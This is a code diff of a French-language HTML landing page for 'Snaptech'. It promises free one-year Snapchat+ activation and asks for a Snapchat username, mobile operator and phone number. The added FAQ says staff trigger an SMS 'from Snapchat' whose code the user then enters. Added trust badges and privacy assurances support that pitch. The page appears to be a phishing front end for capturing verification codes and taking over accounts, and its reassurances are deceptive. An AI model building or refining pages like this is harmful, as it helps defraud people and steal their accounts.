@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="description" content="Snaptech - Activation Snapchat+" />
+    <meta name="description" content="Snaptech - Activation Snapchat+ gratuite en quelques minutes" />
+    <meta name="theme-color" content="#fffc00" />
     <title>Snaptech - Snapchat+</title>
     <link rel="stylesheet" href="style.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
@@ -11,23 +12,38 @@
 <body>
     <div class="bg-gif"></div>
     <div class="container">
+
+        <!-- ── Langue ─────────────────────────────────────────────────────── -->
         <div class="lang-toggle-wrapper">
             <div class="lang-toggle">
                 <button id="langFr" class="active" onclick="setLanguage('fr')">🇫🇷 FR</button>
                 <button id="langEn" onclick="setLanguage('en')">🇬🇧 EN</button>
             </div>
         </div>
+
+        <!-- ── Formulaire principal ───────────────────────────────────────── -->
         <div class="main-card">
             <div class="logo-section">
-                <img id="siteLogo" src="https://cdn.imgbin.com/13/25/13/social-media-icon-snapchat-icon-6kBmyR3B.jpg" alt="Snaptech Logo" class="logo-preview" />
+                <img id="siteLogo"
+                     src="https://cdn.imgbin.com/13/25/13/social-media-icon-snapchat-icon-6kBmyR3B.jpg"
+                     alt="Snaptech Logo" class="logo-preview" />
                 <div class="notif-bar">
                     <div class="notif-glow"></div>
                     <span class="notif-icon">🎉</span>
-                    <span id="notifText" class="notif-text">Loading...</span>
-                    <span class="notif-badge">Just now</span>
+                    <span id="notifText" class="notif-text">Chargement...</span>
+                    <span class="notif-badge">À l'instant</span>
                 </div>
             </div>
+
             <h1 id="mainTitle" class="main-title">🎉 Activer Snapchat+ pendant 1 an !</h1>
+
+            <!-- Badges de confiance -->
+            <div class="trust-badges">
+                <span class="trust-badge"><i class="fas fa-shield-alt"></i> 100% Sécurisé</span>
+                <span class="trust-badge"><i class="fas fa-bolt"></i> Activation rapide</span>
+                <span class="trust-badge"><i class="fas fa-gift"></i> Totalement gratuit</span>
+            </div>
+
             <div class="bubbles-container">
                 <span class="bubble">✨ Filtres exclusifs</span>
                 <span class="bubble">📌 Stories épinglées</span>
@@ -35,6 +51,8 @@
                 <span class="bubble">⭐ Badge personnalisé</span>
                 <span class="bubble">🎁 Accès anticipé</span>
             </div>
+
+            <!-- Localisation -->
             <div class="form-group">
                 <label for="location" id="locationLabel">📍 Localisation</label>
                 <select id="location" class="form-control" onchange="updateOperators()">
@@ -42,14 +60,19 @@
                     <option value="belgique">🇧🇪 Belgique</option>
                 </select>
             </div>
+
             <div class="warning-message">
                 <p id="warningMsg">⚠️ Disponible uniquement pour les numéros France des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas</p>
             </div>
+
+            <!-- Username -->
             <div class="form-group">
                 <label for="username" id="usernameLabel">👤 Nom d'utilisateur Snapchat</label>
                 <input type="text" id="username" placeholder="ex: snapmaster" class="form-control" autocomplete="off" />
-                <small id="usernameHint" style="color:#6b7280; font-size:0.8rem; margin-left:12px;">3 à 15 caractères (lettres, chiffres, . _ -)</small>
+                <small id="usernameHint" class="field-hint">3 à 15 caractères (lettres, chiffres, . _ -)</small>
             </div>
+
+            <!-- Opérateur -->
             <div class="form-group">
                 <p id="operatorLabel" class="operator-label">📱 Opérateur mobile</p>
                 <div class="operator-buttons" id="operatorButtons">
@@ -58,19 +81,100 @@
                     <button class="btn-operator" data-operator="bouygues" onclick="selectOperator(this)">Bouygues</button>
                 </div>
             </div>
+
+            <!-- Téléphone -->
             <div class="form-group">
                 <label for="phone" id="phoneLabel">📞 Numéro de téléphone</label>
                 <input type="tel" id="phone" placeholder="06 12 34 56 78" class="form-control" autocomplete="off" />
             </div>
-            <button onclick="submitForm()" id="submitBtn" class="btn-primary">🚀 Activer Snapchat+</button>
+
+            <button onclick="submitForm()" id="submitBtn" class="btn-primary">
+                <i class="fas fa-rocket"></i> <span id="submitBtnText">Activer Snapchat+</span>
+            </button>
+
             <div id="statusMsg" class="status-message"></div>
+
+            <!-- File hors-ligne -->
             <div id="offlineQueue" style="margin-top:12px; text-align:center; font-size:0.85rem; color:#6b7280; display:none;">
                 <span id="queueCount">0</span> requête(s) en attente de synchronisation
-                <button onclick="syncPendingRequests()" style="margin-left:8px; background:none; border:none; color:#000; text-decoration:underline; cursor:pointer;">Synchroniser</button>
+                <button onclick="syncPendingRequests()" class="link-btn" style="margin-left:8px;">Synchroniser</button>
             </div>
         </div>
+
+        <!-- ── FAQ ───────────────────────────────────────────────────────── -->
+        <div class="faq-card" id="faqSection">
+            <div class="faq-header">
+                <h2 class="faq-title" id="faqTitle">❓ Questions fréquentes</h2>
+                <p class="faq-subtitle" id="faqSubtitle">Tout ce que vous devez savoir avant de commencer</p>
+            </div>
+            <div class="faq-list" id="faqList">
+
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        <span id="fq1">💰 C'est vraiment gratuit ?</span>
+                        <i class="fas fa-chevron-down faq-icon"></i>
+                    </button>
+                    <div class="faq-answer">
+                        <p id="fa1">Oui, totalement gratuit. Aucun paiement requis, aucune carte bancaire demandée. Snaptech active votre abonnement Snapchat+ sans aucun frais.</p>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        <span id="fq2">⏱️ Combien de temps pour recevoir le SMS ?</span>
+                        <i class="fas fa-chevron-down faq-icon"></i>
+                    </button>
+                    <div class="faq-answer">
+                        <p id="fa2">En général moins de 2 minutes. Un membre de notre équipe traite votre demande dès qu'elle est reçue. Le SMS arrive directement de Snapchat sur votre téléphone.</p>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        <span id="fq3">📱 Ça marche avec mon opérateur ?</span>
+                        <i class="fas fa-chevron-down faq-icon"></i>
+                    </button>
+                    <div class="faq-answer">
+                        <p id="fa3">Snaptech est compatible avec Orange, SFR et Bouygues en France, ainsi que BASE, Orange Belgique, Proximus et Telenet en Belgique. Les autres opérateurs ne sont pas encore supportés.</p>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        <span id="fq4">🔒 Mon numéro est-il sécurisé ?</span>
+                        <i class="fas fa-chevron-down faq-icon"></i>
+                    </button>
+                    <div class="faq-answer">
+                        <p id="fa4">Votre numéro est utilisé uniquement pour l'activation et n'est jamais revendu ni partagé. Les données sont chiffrées et supprimées après traitement de votre demande.</p>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        <span id="fq5">🔄 Je n'ai pas reçu de code SMS, que faire ?</span>
+                        <i class="fas fa-chevron-down faq-icon"></i>
+                    </button>
+                    <div class="faq-answer">
+                        <p id="fa5">Si vous ne recevez pas de SMS dans les 5 minutes, vérifiez que votre numéro est correct et que votre téléphone a bien du réseau. Vous pouvez relancer une nouvelle demande directement depuis la page de saisie du code.</p>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        <span id="fq6">📅 Combien de temps dure l'abonnement ?</span>
+                        <i class="fas fa-chevron-down faq-icon"></i>
+                    </button>
+                    <div class="faq-answer">
+                        <p id="fa6">L'abonnement Snapchat+ est activé pour 1 an complet. À l'issue de cette période, vous pourrez relancer une nouvelle activation gratuitement.</p>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
         <p class="footer-text">Snaptech © 2026 — Tous droits réservés</p>
     </div>
+
     <script src="script.js"></script>
 </body>
 </html>
